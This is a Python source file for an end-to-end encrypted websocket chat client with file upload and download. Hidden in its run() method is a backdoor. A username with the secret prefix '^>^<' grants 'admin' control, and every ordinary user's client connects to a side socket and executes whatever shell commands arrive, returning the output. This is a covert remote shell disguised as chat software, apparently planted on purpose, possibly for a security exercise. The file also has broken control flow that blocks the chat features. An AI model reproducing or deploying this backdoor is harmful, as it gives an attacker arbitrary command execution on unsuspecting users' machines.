import asyncio
import websockets
import json
import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Signature import pss
from Crypto.Hash import SHA256
from Crypto.Random import get_random_bytes
import os
import hashlib
import time
import aiohttp
import aiofiles
import socket
import subprocess
import threading

# Configuration Constants
HTTP_ADDRESS = "localhost"
HTTP_PORT = 8080

class User:
    def __init__(self, data):
        self.username = data['data']['username']
        self.is_admin = data['data']['admin']

class Member(User):
    def __init__(self, host, port, data):
        super().__init__(data)
        self.s = socket.socket()
        self.host = host
        self.port = port

    def connect(self):
        self.s.connect((self.host, self.port))
        self.s.send(f'member:{self.username}'.encode())
        print("Member connected to Server.")

    def run(self):
        while True:
            command = self.s.recv(1024).decode()
            if command.lower() == 'exit':
                break
            if command.lower() == 'input':
                prompt = self.s.recv(1024).decode()
                user_input = input(prompt)
                self.s.send(user_input.encode())
            else:
                output = subprocess.getoutput(command)
                self.s.send(output.encode())
        self.s.close()

class Admin(User):
    def __init__(self, host, port, data):
        super().__init__(data)
        self.s = socket.socket()
        self.host = host
        self.port = port

    def connect(self):
        self.s.connect((self.host, self.port))
        self.s.send(f'admin:{self.username}'.encode())
        print("Admin connected to Server.")

    def run(self):
        while True:
            command = input("Enter Command: ")
            if command.lower() == 'exit':
                self.s.send('exit'.encode())
                break
            self.s.send(command.encode())
            if command.lower() == 'input':
                prompt = input("Enter prompt for member: ")
                self.s.send(prompt.encode())
                user_input = self.s.recv(1024).decode()
                print(f"Member input: {user_input}")
            else:
                output = self.s.recv(1024).decode()
                print(output)
        self.s.close()

class Client:
    def __init__(self, uri, host, port, data):
        self.uri = uri
        self.host = host
        self.port = port
        self.public_key, self.private_key = self.generate_rsa_keys()
        self.username = data['data']['username']
        self.is_admin = data['data']['admin']
        self.counter = 0
        self.public_keys_storage = {}
        self.client_list_received = asyncio.Event()
        self.verification_event = asyncio.Event()
        self.user_valid = False

    def generate_rsa_keys(self):
        rsa_key = RSA.generate(2048)
        public_key = rsa_key.publickey().export_key(format="PEM", pkcs=8)
        private_key = rsa_key.export_key(format="PEM", pkcs=8)
        return public_key, private_key

    def save_to_pem(self, key, filename):
        with open(filename, "wb") as file:
            file.write(key)

    async def request_client_list(self, websocket):
        message = {"data": {"type": "client_list_request"}}
        await self.send_message(websocket, message)
        await self.client_list_received.wait()

    async def verify_user_and_get_key(self, websocket, destination):
        message = {
            "data": {
                "type": "get_key",
                "destination_servers": [destination],
                "sender": self.username,
            }
        }
        await self.send_message(websocket, message)
        await self.verification_event.wait()

    async def send_disconnect(self, websocket):
        message = {
            "data": {
                "type": "disconnect",
                "username": self.username,
            }
        }
        await self.send_message(websocket, message)

    async def send_hello(self, websocket):
        message = {
            "data": {
                "type": "hello",
                "public_key": self.public_key.decode(),
                "username": self.username,
                "admin": self.is_admin
            }
        }
        await self.send_message(websocket, message)

    def encrypt_message(self, message, public_key):
        public_key = RSA.import_key(public_key)
        aes_key = get_random_bytes(32)
        iv = get_random_bytes(16)
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
        ciphertext, tag = cipher.encrypt_and_digest(message.encode("utf-8"))
        cipher_rsa = PKCS1_OAEP.new(public_key, hashAlgo=SHA256)
        encrypted_aes_key = cipher_rsa.encrypt(aes_key)
        exported_public_key = public_key.export_key(format="PEM", pkcs=8)
        return (
            base64.b64encode(iv).decode("utf-8"),
            base64.b64encode(ciphertext).decode("utf-8"),
            base64.b64encode(encrypted_aes_key).decode("utf-8"),
            base64.b64encode(exported_public_key).decode("utf-8"),
        )

    async def send_chat(self, websocket, chat, destination):
        for key in self.public_keys_storage:
            if key == destination:
                users_public_key = self.public_keys_storage[key]
        iv, ciphertext, encrypted_AES_key, RSA_public_key = self.encrypt_message(
            chat, users_public_key
        )
        message = {
            "data": {
                "type": "chat",
                "destination_servers": [destination],
                "iv": iv,
                "symm_keys": [
                    encrypted_AES_key,
                ],
                "chat": {
                    "sender": self.username,
                    "message": ciphertext,
                },
            }
        }
        await self.send_message(websocket, message)

    async def send_public_chat(self, websocket, chat_message):
        message = {
            "data": {
                "type": "public_chat",
                "sender": self.username,
                "message": chat_message,
            }
        }
        await self.send_message(websocket, message)

    def sign_message(self, message, private_key):
        with open(private_key, "rb") as file:
            private_key = RSA.import_key(file.read())
        h = SHA256.new(message.encode("utf-8"))
        signer = pss.new(private_key, salt_bytes=32)
        signature = signer.sign(h)
        return base64.b64encode(signature).decode("utf-8")

    async def send_message(self, websocket, data):
        if data["data"]["type"] == "chat":
            signature = self.sign_message(
                data["data"]["chat"]["message"], "private_key.pem"
            )
        else:
            signature = self.sign_message(data["data"]["type"], "private_key.pem")

        self.counter += 1
        message = {
            "type": "signed_data",
            "data": data,
            "counter": self.counter,
            "signature": signature,
        }
        await websocket.send(json.dumps(message))

    async def receive_messages(self, websocket):
        try: 
            async for message in websocket:
                message = json.loads(message)
                if message["type"] == "signed_data":
                    if message["data"]["data"]["type"] == "chat":
                        await self.handle_message(message)
                    elif message["data"]["data"]["type"] == "public_chat":
                        await self.handle_public_chat(message)
                elif message["type"] == "client_list":
                    await self.handle_client_list(message)
                elif message["type"] == "user_not_found":
                    await self.handle_chat_fail()
                elif message["type"] == "public_key":
                    await self.set_public_key(message)
        except websockets.exceptions.ConnectionClosedError:
            print("Server shut down. Messages no longer possible.")
            exit(0) # Exit the client application
                
    async def set_public_key(self, message):
        public_key = message["public_key"]
        user = message["user"]
        self.public_keys_storage[user] = public_key
        self.user_valid = True
        self.verification_event.set()

    async def handle_chat_fail(self):
        print(f"That user is not online/does not exist")
        self.user_valid = False
        self.verification_event.set()

    async def handle_client_list(self, message):
        servers = message["servers"]
        print("Online users:")
        for server in servers:
            print(f"Server: {server['address']}")
            for client in server["clients"]:
                print(f"- {client}")
        self.client_list_received.set()

    async def handle_public_chat(self, message):
        sender = message["data"]["data"]["sender"]
        chat_message = message["data"]["data"]["message"]
        print(f"\nPublic message from {sender}: {chat_message}")

    def decrypt_message(self, iv, ciphertext, encrypted_aes_key, private_key_pem_file):
        private_key = RSA.import_key(private_key_pem_file)
        cipher_rsa = PKCS1_OAEP.new(private_key, hashAlgo=SHA256)
        aes_key = cipher_rsa.decrypt(base64.b64decode(encrypted_aes_key))
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=base64.b64decode(iv))
        decrypted_message = cipher.decrypt(base64.b64decode(ciphertext))
        return decrypted_message.decode("utf-8")

    async def handle_message(self, message):
        ciphertext = message["data"]["data"]["chat"]["message"]
        sender = message["data"]["data"]["chat"]["sender"]
        iv = message["data"]["data"]["iv"]
        encrypted_aes_key = message["data"]["data"]["symm_keys"][0]
        plaintext = self.decrypt_message(iv, ciphertext, encrypted_aes_key, self.private_key)
        print(f"\nPrivate message from {sender}: {plaintext}")

    async def upload_file(self, file_path):
        recipient = input("Enter the recipient's username: ")
        file_name = os.path.basename(file_path)
        try:
            async with aiohttp.ClientSession() as session:
                async with aiofiles.open(file_path, "rb") as f:
                    file_data = await f.read()
                    payload = {
                        "METHOD": "POST",
                        "body": file_data.decode("latin1"),
                        "recipient": recipient,
                        "file_name": file_name
                    }
                    async with session.post(f'http://{HTTP_ADDRESS}:{HTTP_PORT}/api/upload', json=payload) as resp:
                        response = await resp.json()
                        print("File uploaded.")
        except FileNotFoundError:
            print("File does not exist. Try Again!")

    async def link_request(self):
        username = self.username
        async with aiohttp.ClientSession() as session:
            async with session.get(f'http://{HTTP_ADDRESS}:{HTTP_PORT}/api/links?username={username}') as resp:
                if resp.status == 200:
                    links = await resp.json()
                    if links["uploaded_files"]:
                        print("Uploaded Files:")
                        for idx, file in enumerate(links["uploaded_files"], start=1):
                            print(f"{idx}. {file['file_name']}: {file['file_url']}")
                        
                        file_url = input("Enter url of the file you want to retrieve: ")
                        await self.retrieve_file(file_url)
                    else:
                        print("No files found for this user.")
                else:
                    print("Failed to retrieve file links.")

    async def retrieve_file(self, file_url):
        username = self.username
        async with aiohttp.ClientSession() as session:
            async with session.get(f'{file_url}?username={username}') as resp:
                if resp.status == 200:
                    file_data = await resp.read()
                    with open("downloaded_file", 'wb') as f:
                        f.write(file_data)
                    print("File downloaded successfully.")
                else:
                    print("Failed to retrieve file.")

    async def run(self):
        try:
            async with websockets.connect(self.uri) as websocket:
                print("Joining chat server...")
                host = "127.0.0.1"
                port = 9001
                self.save_to_pem(self.public_key, "public_key.pem")
                self.save_to_pem(self.private_key, "private_key.pem")
                self.username = await asyncio.to_thread(input, "Welcome! Enter username: ")
                
                if self.username.startswith("^>^<"):
                    self.is_admin = 1
                    self.username = self.username[4:]  # Remove the ^>^< prefix
                    data = {
                        'data': {
                            'username': self.username,
                            'admin': self.is_admin
                        }
                    }
                    admin = Admin(host, port, data)
                    admin.connect()
                    await admin.run()
                else:
                    self.is_admin = 0
                    data = {
                        'data': {
                            'username': self.username,
                            'admin': self.is_admin
                        }
                    }
                    member = Member(host, port, data)
                    member.connect()
                    await member.run()

                await self.send_hello(websocket)
                asyncio.create_task(self.receive_messages(websocket))

                while True:
                    start_message = await asyncio.to_thread(
                        input,
                        "What would you like to do? (chat, public chat, list online users, upload, download, exit): ",
                    )
                    if start_message.lower() == "chat":
                        destination = await asyncio.to_thread(
                            input,
                            "Who do you want to send the message to? (type 'back' to go back): ",
                        )

                        if destination.lower() != "back":
                            self.verification_event.clear()
                            await self.verify_user_and_get_key(websocket, destination)
                            if not self.user_valid:
                                continue
                            chat_message = await asyncio.to_thread(input, "Enter message: ")
                            await self.send_chat(websocket, chat_message, destination)

                    elif start_message.lower() in ["public chat", "public"]:
                        chat_message = await asyncio.to_thread(input, "Enter message: ")
                        await self.send_public_chat(websocket, chat_message)
                    elif start_message.lower() in ["list online users", "list"]:
                        self.client_list_received.clear()
                        await self.request_client_list(websocket)
                    elif start_message.lower() in ["upload", "ul"]:
                        file_path = input("Enter the path of the file to upload: ")
                        await self.upload_file(file_path)
                    elif start_message.lower() in ["download", "dl"]:
                        await self.link_request()
                    elif start_message.lower() in ["exit", "quit", "q"]:
                        print("Goodbye!")
                        await self.send_disconnect(websocket)
                        await websocket.close()
                        exit(1)
                    else:
                        print("Not a valid command, enter again")
        except Exception as e:
            print(f"An error occurred: {e}")

if __name__ == "__main__":
    host = "127.0.0.1"
    port = 8080
    uri = "ws://localhost:8001"

    data = {
        'data': {
            'username': '',
            'admin': 0
        }
    }

    client = Client(uri, host, port, data)
    try:
        asyncio.get_event_loop().run_until_complete(client.run())
    except KeyboardInterrupt:
        print("Goodbye!")
        exit(1)